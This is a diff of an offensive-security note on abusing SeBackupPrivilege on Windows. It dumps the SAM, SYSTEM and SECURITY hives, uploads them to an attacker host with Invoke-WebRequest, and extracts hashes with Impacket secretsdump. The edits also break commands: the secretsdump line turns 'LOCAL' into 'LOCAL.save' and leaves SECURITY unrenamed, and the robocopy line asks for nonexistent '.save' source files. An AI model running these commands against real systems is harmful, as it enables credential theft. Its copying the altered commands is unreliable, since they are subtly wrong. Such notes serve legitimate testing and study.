@@ -1,6 +1,6 @@
 ---
 created: 2026-09-02
-updated: 2026-09-18
+updated: 2026-09-20
 tags:
   - Windows
   - Windows_PrivEsc
@@ -71,20 +71,20 @@ whoami /priv
 ## Dumping `SAM`, `SYSTEM`, and `SECURITY` hives
 
 - The `SAM`, `SYSTEM`, and `SECURITY` registry hives are locked by the operating system at runtime and protected by restrictive DACLs.
-- `SeBackupPrivilege` allows you to save protected registry hives using a tool that respects backup semantics, such as [`reg save`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save).
+- `SeBackupPrivilege` allows you to save copies of the protected registry hives using [`reg save`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save) (a dedicated registry backup mechanism).
 
 - Save all three hives to a writable directory:
 
 ```powershell
-reg save HKLM\SAM C:\Windows\Temp\SAM
+reg save HKLM\SAM C:\Windows\Temp\SAM.save
 ```
 
 ```powershell
-reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
 ```
 
 ```powershell
-reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
+reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.save
 ```
 
 | Hive            | Contents                                                               |
@@ -100,19 +100,19 @@ python -m http.server 8000
 ```
 
 ```powershell
-Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SAM
+Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SAM.save
 ```
 ```powershell
-Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SYSTEM
+Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SYSTEM.save
 ```
 ```powershell
-Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SECURITY
+Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SECURITY.save
 ```
 
 - Parse the offline hives with Impacket `secretsdump`:
 
 ```bash
-impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY LOCAL.save
 ```
 
 | Flag        | Argument   | Description                                                                                 |
@@ -122,7 +122,7 @@ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 | `-security` | `SECURITY` | Path to the offline `SECURITY` hive for LSA secrets and cached credentials.                 |
 | `LOCAL`     | -          | Instructs `secretsdump` to process offline files rather than connecting to a remote target. |
 
->[!note] See [[🛠️ Dumping SAM, SYSTEM & SECURITY hives]].
+>[!note] See [[Dumping Windows registry hives]].
 ## Extracting protected files from volume shadow copies
 
 - [`diskshadow.exe`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) is a Windows Server utility for creating and managing **Volume Shadow Copy Service (VSS) shadow copies**. A shadow copy provides a point-in-time view of a volume.
@@ -166,13 +166,13 @@ diskshadow.exe /c "list shadows all"
 4. Copy the target files from the shadow copy to a location where you can analyze them:
 
 ```powershell
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\SAM.hive
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\SAM.save
 ```
 ```powershell
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM.hive
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM.save
 ```
 ```powershell
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY.hive
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY.save
 ```
 
 5. Remove the shadow copy when done:
@@ -187,7 +187,7 @@ diskshadow.exe /c "delete shadows all"
 - This works directly on the live `C:\` volume for files that are protected by DACL but not locked by another process:
 
 ```powershell
-robocopy /b C:\Windows\System32\config C:\Windows\Temp SAM SYSTEM SECURITY
+robocopy /b C:\Windows\System32\config C:\Windows\Temp SAM.save SYSTEM.save SECURITY.save
 ```
 
 >[!warning] The `NTDS.dit` file on a live domain controller is exclusively locked by the `NTDS` service. You can't copy it with `robocopy /b` alone; create a shadow copy first and copy from the exposed volume ([[#Extracting protected files from volume shadow copies]]).
